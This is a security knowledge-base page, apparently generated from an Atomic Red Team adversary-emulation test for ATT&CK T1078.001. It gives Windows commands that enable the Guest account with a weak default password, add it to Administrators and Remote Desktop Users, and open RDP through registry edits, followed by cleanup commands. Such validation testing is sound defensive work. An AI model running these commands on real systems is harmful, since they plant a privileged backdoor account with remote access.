---
atomic_guid: "99747561-ed8d-47f2-9c91-1e5fde1ed6e0"
title: "Enable Guest account with RDP capability and admin privileges"
framework: "atomic"
generated: "true"
attack_technique_id: "T1078.001"
attack_technique_name: "Valid Accounts: Default Accounts"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.yaml"
build_date: "2026-04-27 19:12:26"
executor: "command_prompt"
aliases:
  - "99747561-ed8d-47f2-9c91-1e5fde1ed6e0"
  - "Enable Guest account with RDP capability and admin privileges"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
and desktop will allow multiple RDP connections.

## ATT&CK Mapping

- [[kb/attack/techniques/T1078-valid_accounts#^t1078001-default-accounts|T1078.001: Default Accounts]]

## Input Arguments

### guest_password

- description: Specify the guest password
- type: string
- default: Password123!

### guest_user

- description: Specify the guest account
- type: string
- default: guest

### local_admin_group

- description: Specify the admin localgroup name
- type: string
- default: Administrators

### remote_desktop_users_group_name

- description: Specify the remote desktop users group name
- type: string
- default: Remote Desktop Users

### remove_rdp_access_during_cleanup

- description: Set to 1 if you want the cleanup to remove RDP access to machine
- type: integer
- default: 0

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
net user #{guest_user} /active:yes
net user #{guest_user} #{guest_password}
net localgroup #{local_admin_group} #{guest_user} /add
net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /add
reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
```

### Cleanup

```cmd
net user #{guest_user} /active:no >nul 2>&1
net localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1
net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /delete >nul 2>&1
if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.yaml)
